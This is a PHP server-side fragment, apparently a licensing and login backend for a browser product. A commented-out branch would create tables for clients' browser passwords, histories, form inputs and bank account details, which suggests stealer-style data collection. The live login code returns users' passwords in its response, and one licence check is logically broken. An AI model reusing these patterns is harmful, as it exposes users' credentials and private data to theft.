                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } else {
                Firewall::runtimeFailure("Bad Request", [
                    "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                    "error" => ["description" => "Your requested url is broken!!"]
                ]);
            }
        }
        /*                else if(Character::lower(self::$requestMethod) === Character::lower("test")){
            self::$conOfDatabase->select("system")->create([
                "clients.browser.passwords.info",
                "clients.browser.histories.info",
                "clients.browser.inputs.info",
                "clients.bank.account.info",
                "clients.earning.captcha.info",
            ]);
        }*/
        else {
            Firewall::runtimeFailure("Bad Request", [
                "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                "error" => ["description" => "Your requested url is broken!!"]
            ]);
        }
    }


    /**
     * @param array $RequestedDataArray
     */
    private static function getVerifiedProductId(array $RequestedDataArray) : void
    {
        $idNbOfProduct = self::$conOfDatabase->getIdNbOfVerifiedProduct(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "name")), Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "version")), Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "ip")), Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "browser")));
        if (!is_numeric($idNbOfProduct)) {
            Storage::StreamAsJson(array('app_pub_id' => Encryption::static($idNbOfProduct)));
        } else {
            self::$conOfDatabase->addProductToInstList(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "name")), Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "version")), Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "ip")), Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "browser")));
            Storage::StreamAsJson(array('app_pub_id' => Encryption::static(self::$conOfDatabase->getLastInsertedId("installed.products"))));
        }
    }

    private static function getLicenceLimitByPlan(string $plan) : void
    {
        switch ($plan) {
            case 'trial':
                self::$limitOfProductLicence = 2000;
                self::$limitOfProductLicenceBase = 2000;
                break;
            case 'Plan 01':
                self::$limitOfProductLicence = 10000;
                self::$limitOfProductLicenceBase = 10000;
                break;
            case 'Plan 02':
                self::$limitOfProductLicence = 20000;
                self::$limitOfProductLicenceBase = 20000;
                break;
            case 'Plan 03':
                self::$limitOfProductLicence = 35000;
                self::$limitOfProductLicenceBase = 35000;
                break;
            case 'Plan 04':
                self::$limitOfProductLicence = 50000;
                self::$limitOfProductLicenceBase = 50000;
                break;
            default:
                self::$limitOfProductLicence = 0;
                self::$limitOfProductLicenceBase = 0;
                break;
        }
    }

    private static function processUserAuthentication($detailsArray, $IdNbOfUsr, $userDetails): void
    {
        /*$data->userdata->_default_->app_id*/
        $app = self::$conOfDatabase->getInstPrdInfById(Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")));
        if (is_array($app) and count($app) > 0) {
            $app = self::$conOfDatabase->getPrdLcnDtlByPrdId(Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")));
            if (ArrayCollection::value($app, "ipAddress") && ArrayCollection::value($app, "ipAddress") !== Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "ip"))) {
                self::$conOfDatabase->resetItmFrmLcnByPrdId(
                    Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")),
                    "ipAddress", ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "ip")
                );
            }
            if (ArrayCollection::value($app, "browserNameFull") && ArrayCollection::value($app, "browserNameFull") !== Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "browser"))) {
                self::$conOfDatabase->resetItmFrmLcnByPrdId(
                    Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")),
                    "browserNameFull", ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "browser")
                );
            }
        }

        if (is_array($userDetails) and count($userDetails) > 0) {
            self::$conOfDatabase->updateIdNbOfPrdOfUsr(
                Number::filterInt($IdNbOfUsr),
                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id"))
            );

            self::$conOfDatabase->updateUsrLcn(
                Number::filterInt($IdNbOfUsr),
                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id"))
            );
            self::upgradeLcnLmt(Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")));
            Storage::StreamAsJson(
                array(
                    'message' => 'success', 'login' => 'passed', 'way' => 'email_password', 'log_status' => 'success',
                    'user' => array(
                        'firstName' => $userDetails['firstName'], 'lastName' => $userDetails['lastName'], 'emailAddress' => $userDetails['emailAddress'], 'password' => $userDetails['password']
                    ), 'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                    Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "app_id")),
                    Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "ip")),
                    Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($detailsArray, "userdata"), "_default_"), "browser"))
                )
                )
            );
        } else {
            Storage::StreamAsJson(array('message' => 'error', 'login' => 'failed', 'way' => 'email_password'));
        }
    }

    private static function upgradeLcnLmt(string $prdId)
    {
        $licence = self::$conOfDatabase->getPrdLcnDtlByPrdId($prdId);
        if (Time::getToday() === ArrayCollection::value($licence, 'nextUpdate')) {
            if ($licence['limitBase'] !== 2000 || $licence['limitBase'] !== 0 || $licence['limitBase'] !== null) {
                self::$conOfDatabase->upgradeLcnLmt($prdId, $licence['limitBase']);
            }
        }
    }

}